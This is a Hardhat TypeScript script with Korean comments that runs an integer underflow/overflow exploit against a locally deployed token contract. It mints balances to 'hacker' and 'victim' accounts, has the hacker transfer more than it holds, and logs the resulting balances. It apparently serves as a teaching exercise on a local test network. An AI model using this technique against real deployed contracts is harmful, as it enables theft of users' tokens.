// npx hardhat run scripts/Exploit2_UnderflowsOverflows.ts --network hardhat
import {ethers} from "hardhat";

async function main() {
    const [owner, victim, hacker] = await ethers.getSigners();

    // proxyContract 배포
    const proxyContract = await ethers.deployContract("ProxyTargetContract");
    const proxyAddress = await proxyContract.getAddress();

    // targetContract 배포
    const targetContract = await ethers.deployContract("TargetContract", [
        owner, // constructor 인자
        proxyAddress,
    ])
    const targetAddress = await targetContract.getAddress();

    console.log("Proxy address:", proxyAddress);
    console.log("Target address: ", targetAddress);

    // owner 주소로 mint(hacker.address, 1.0) 실행
    await targetContract
        .connect(owner)
        .mint(hacker.address, ethers.parseEther("1.0"));

    // hacker의 balance 확인
    console.log(
        "hackers's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(hacker.address)
        )
     )

    // owner 주소로 mint(victim.address, 1.0) 실행
    await targetContract
        .connect(owner)
        .mint(victim.address, ethers.parseEther("1.5"));

    // victim balance 확인
    console.log(
        "victim's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(victim.address)
        )
     )

    // victim이 hacker에게 1.5 이더 보내기 (overflow)
    await targetContract
        .connect(hacker)
        .transferFrom(hacker.address, victim.address, ethers.parseEther("1.5"));

    // hacker의 balance 확인
    console.log(
        "hackers's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(hacker.address)
        )
    )

    // victim balance 확인
    console.log(
        "victim's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(victim.address)
        )
    )

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
})